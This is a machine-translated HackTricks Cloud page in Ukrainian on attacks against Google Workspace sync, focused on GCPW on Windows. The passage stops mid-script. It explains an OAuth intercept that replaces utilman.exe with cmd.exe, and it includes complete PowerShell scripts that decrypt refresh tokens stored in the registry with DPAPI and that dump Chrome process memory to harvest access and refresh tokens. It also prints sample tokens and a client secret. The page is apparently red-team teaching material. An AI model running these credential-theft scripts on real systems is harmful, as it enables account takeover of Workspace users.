# GWS - –ê—Ç–∞–∫–∏ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó Workspace (GCPW, GCDS, –°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –∫–∞—Ç–∞–ª–æ–≥—É –∑ AD —Ç–∞ EntraID)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## GCPW - Google Credential Provider –¥–ª—è Windows

–¶–µ —î–¥–∏–Ω–∏–π –≤—Ö—ñ–¥, —è–∫–∏–π –Ω–∞–¥–∞—î Google Workspaces, —â–æ–± –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–≥–ª–∏ –≤—Ö–æ–¥–∏—Ç–∏ –≤ —Å–≤–æ—ó –ü–ö –∑ Windows, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Å–≤–æ—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Workspace**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ü–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ —Ç–æ–∫–µ–Ω–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ Google Workspace —É –¥–µ—è–∫–∏—Ö –º—ñ—Å—Ü—è—Ö –Ω–∞ –ü–ö.

{% hint style="success" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) –∑–¥–∞—Ç–Ω–∏–π –≤–∏—è–≤–ª—è—Ç–∏ **GCPW**, –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ **–Ω–∞–≤—ñ—Ç—å —Ç–æ–∫–µ–Ω–∏**.
{% endhint %}

### GCPW - MitM

–ö–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –ü–ö –∑ Windows, —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–æ–≤–∞–Ω–æ–≥–æ –∑ Google Workspace —á–µ—Ä–µ–∑ GCPW, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –∑–∞–ø–æ–≤–Ω–∏—Ç–∏ –∑–≤–∏—á–∞–π–Ω—É —Ñ–æ—Ä–º—É –≤—Ö–æ–¥—É. –¶—è —Ñ–æ—Ä–º–∞ –≤—Ö–æ–¥—É –ø–æ–≤–µ—Ä–Ω–µ –∫–æ–¥ OAuth, —è–∫–∏–π –ü–ö –æ–±–º—ñ–Ω—è—î –Ω–∞ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –≤ –∑–∞–ø–∏—Ç—ñ, –ø–æ–¥—ñ–±–Ω–æ–º—É –¥–æ: 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

–ù–æ–≤—ñ —Ä—è–¥–∫–∏ –±—É–ª–∏ –¥–æ–¥–∞–Ω—ñ –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è —á–∏—Ç–∞–±–µ–ª—å–Ω–æ—Å—Ç—ñ.

{% hint style="info" %}
–ë—É–ª–æ –º–æ–∂–ª–∏–≤–∏–º –≤–∏–∫–æ–Ω–∞—Ç–∏ MitM, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ `Proxifier` –Ω–∞ –ü–ö, –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `utilman.exe` –Ω–∞ `cmd.exe` —ñ –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ **—Ñ—É–Ω–∫—Ü—ñ—ó –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ** –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤—Ö–æ–¥—É –≤ Windows, —â–æ –≤–∏–∫–æ–Ω–∞—î **CMD**, –∑ —è–∫–æ–≥–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ Proxifier**.\
–ù–µ –∑–∞–±—É–¥—å—Ç–µ **–±–ª–æ–∫—É–≤–∞—Ç–∏ QUICK UDP** —Ç—Ä–∞—Ñ—ñ–∫ —É `Proxifier`, —â–æ–± –≤—ñ–Ω –∑–Ω–∏–∑–∏–≤—Å—è –¥–æ TCP –∑–≤'—è–∑–∫—É, —ñ –≤–∏ –º–æ–≥–ª–∏ –π–æ–≥–æ –±–∞—á–∏—Ç–∏.

–¢–∞–∫–æ–∂ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ –≤ "–°–ª—É–∂–±–∞—Ö —Ç–∞ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞—Ö" –æ–±–∏–¥–≤—ñ –æ–ø—Ü—ñ—ó —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç Burp CA –≤ Windows.
{% endhint %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ–¥–∞–≤—à–∏ –∫–ª—é—á—ñ `enable_verbose_logging = 1` —Ç–∞ `log_file_path = C:\Public\gcpw.log` –≤ **`HKLM:\SOFTWARE\Google\GCPW`**, –º–æ–∂–Ω–∞ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –¥–µ—è–∫—ñ –∂—É—Ä–Ω–∞–ª–∏.

### GCPW - –í—ñ–¥–±–∏—Ç–æ–∫

–ú–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ GCPW –Ω–∞ –ø—Ä–∏—Å—Ç—Ä–æ—ó, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏, —á–∏ —ñ—Å–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –∞–±–æ —á–∏ —ñ—Å–Ω—É—é—Ç—å –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–ª—é—á—ñ —Ä–µ—î—Å—Ç—Ä—É:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
–í **`HKCU:\SOFTWARE\Google\Accounts`** –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ **refresh token**, —è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –Ω–µ—â–æ–¥–∞–≤–Ω–æ —É–≤—ñ–π—à–æ–≤ –≤ —Å–∏—Å—Ç–µ–º—É.

–í **`HKLM:\SOFTWARE\Google\GCPW\Users`** –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ **–¥–æ–º–µ–Ω** , —è–∫—ñ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É –≤ –∫–ª—é—á—ñ `domains_allowed`, –∞ –≤ –ø—ñ–¥–∫–ª—é—á–∞—Ö –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–∞–∫—É —è–∫ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞, –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–µ—Ä–º—ñ–Ω–∏ –¥—ñ—ó —Ç–æ–∫–µ–Ω—ñ–≤, –æ–±—Ä–æ–±–Ω–∏–∫ —Ç–æ–∫–µ–Ω—ñ–≤...

{% hint style="info" %}
–û–±—Ä–æ–±–Ω–∏–∫ —Ç–æ–∫–µ–Ω—ñ–≤ - —Ü–µ —Ç–æ–∫–µ–Ω, —è–∫–∏–π –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `eth.` —ñ –∑ —è–∫–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏—Ç—è–≥—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–π—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É, —è–∫-–æ—Ç:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

–ù–∞—Å–∫—ñ–ª—å–∫–∏ –º–µ–Ω—ñ –≤—ñ–¥–æ–º–æ, –Ω–µ–º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ refresh token –∞–±–æ access token –∑ token handle.
{% endhint %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, —Ñ–∞–π–ª **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** —î json, —â–æ –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ä—ñ–∑–Ω—ñ **–Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è**, —Ç–∞–∫—ñ —è–∫ `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (—è–∫—â–æ –∫—ñ–ª—å–∫–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ Workspace –º–æ–∂—É—Ç—å —É–≤—ñ–π—Ç–∏ –Ω–∞ –∫–æ–º–ø'—é—Ç–µ—Ä) —Ç–∞ `validityPeriodDays` (–∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥–Ω—ñ–≤, –ø—Ä–æ—Ç—è–≥–æ–º —è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–≤—Ç–æ—Ä–Ω–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ Google).

### GCPW - –¢–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ä–µ—î—Å—Ç—Ä—É

–£ —Ä–µ—î—Å—Ç—Ä—ñ **`HKCU:\SOFTWARE\Google\Accounts`** –º–æ–∂–µ –±—É—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∑ **`refresh_token`**, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ. –ú–µ—Ç–æ–¥ **`ProtectedData.Unprotect`** –º–æ–∂–µ –ª–µ–≥–∫–æ –π–æ–≥–æ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏.

<details>

<summary>–û—Ç—Ä–∏–º–∞—Ç–∏ <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> –¥–∞–Ω—ñ —Ç–∞ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

–ü—Ä–∏–∫–ª–∞–¥ –≤–∏—Ö–æ–¥—É:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

–Ø–∫ –ø–æ—è—Å–Ω–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –≤—ñ–¥–µ–æ**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), —è–∫—â–æ –≤–∏ –Ω–µ –∑–Ω–∞–π–¥–µ—Ç–µ —Ç–æ–∫–µ–Ω —É —Ä–µ—î—Å—Ç—Ä—ñ, –º–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è (–∞–±–æ –≤–∏–¥–∞–ª–∏—Ç–∏) –∑ **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** —ñ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞, –π–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –∑–Ω–æ–≤—É —É–≤—ñ–π—Ç–∏, –∞ **—Ç–æ–∫–µ–Ω –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–µ—î—Å—Ç—Ä—ñ**.

### GCPW - –¢–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–∏—Å–∫–∞

–§–∞–π–ª **`%LocalAppData%\Google\Chrome\User Data\Local State`** –∑–±–µ—Ä—ñ–≥–∞—î –∫–ª—é—á –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ **`refresh_tokens`**, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏—Ö –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–ø—Ä–æ—Ñ—ñ–ª—ñ–≤ Google Chrome** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ç–∞–∫–∏—Ö —è–∫:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

–ú–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫–∏–π **C# –∫–æ–¥**, —â–æ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ —Ü–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ —É —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–º—É –≤–∏–≥–ª—è–¥—ñ –≤ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ —Ü—å–æ–º—É –∫–æ–¥—ñ: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

–ú–æ–∂–Ω–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è AESGCM, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ **–≤–µ—Ä—Å—ñ—ó** (**`v10`** –Ω–∞ –¥–∞–Ω–∏–π –º–æ–º–µ–Ω—Ç), –ø–æ—Ç—ñ–º [**–º–∞—î 12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), –∞ –ø–æ—Ç—ñ–º –º–∞—î **—à–∏—Ñ—Ä–æ—Ç–µ–∫—Å—Ç** –∑ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–º **mac 16B**.

### GCPW - –í–∏—Ç—è–≥ —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ –ø—Ä–æ—Ü–µ—Å—ñ–≤

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è** –∫–æ–∂–Ω–æ–≥–æ **–ø—Ä–æ—Ü–µ—Å—É Chrome**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `procdump`, –≤–∏—Ç—è–≥—Ç–∏ **—Ä—è–¥–∫–∏** —ñ –ø–æ—Ç—ñ–º **—à—É–∫–∞—Ç–∏** —Ä—è–¥–∫–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ **—Ç–æ–∫–µ–Ω–∞–º–∏ –¥–æ—Å—Ç—É–ø—É —Ç–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è**. –Ø–∫—â–æ Chrome –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ —è–∫–æ–≥–æ—Å—å —Å–∞–π—Ç—É Google, –¥–µ—è–∫—ñ **–ø—Ä–æ—Ü–µ—Å–∏ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º—É—Ç—å —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞/–∞–±–æ –¥–æ—Å—Ç—É–ø—É –≤ –ø–∞–º'—è—Ç—ñ!**

<details>

<summary>–í–∏—Ç—è–≥—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∏ Chrome —Ç–∞ —à—É–∫–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

–Ø —Å–ø—Ä–æ–±—É–≤–∞–≤ —Ç–µ –∂ —Å–∞–º–µ –∑ `gcpw_extension.exe`, –∞–ª–µ –≤—ñ–Ω –Ω–µ –∑–Ω–∞–π—à–æ–≤ –∂–æ–¥–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞.

–ó —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏, **–¥–µ—è–∫—ñ –≤–∏—Ç—è–≥–Ω—É—Ç—ñ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É –Ω–µ –±—É–¥—É—Ç—å –¥—ñ–π—Å–Ω–∏–º–∏ (—Ö–æ—á–∞ –¥–µ—è–∫—ñ –±—É–¥—É—Ç—å)**. –Ø —Å–ø—Ä–æ–±—É–≤–∞–≤ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, —â–æ–± –≤–∏–¥–∞–ª—è—Ç–∏ —Å–∏–º–≤–æ–ª–∏ –ø–æ –æ–¥–Ω–æ–º—É, —â–æ–± —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥—ñ–π—Å–Ω–∏–π —Ç–æ–∫–µ–Ω –∑ –¥–∞–º–ø—É. –¶–µ –Ω—ñ–∫–æ–ª–∏ –Ω–µ –¥–æ–ø–æ–º–∞–≥–∞–ª–æ –º–µ–Ω—ñ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω–∏–π, –∞–ª–µ, –º–æ–∂–ª–∏–≤–æ, —Ü–µ –º–æ–∂–µ:

<details>

<summary>–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É, –≤–∏–¥–∞–ª—è—é—á–∏ —Å–∏–º–≤–æ–ª–∏ –ø–æ –æ–¥–Ω–æ–º—É</summary>
```bash
#!/bin/bash

# Define the initial access token
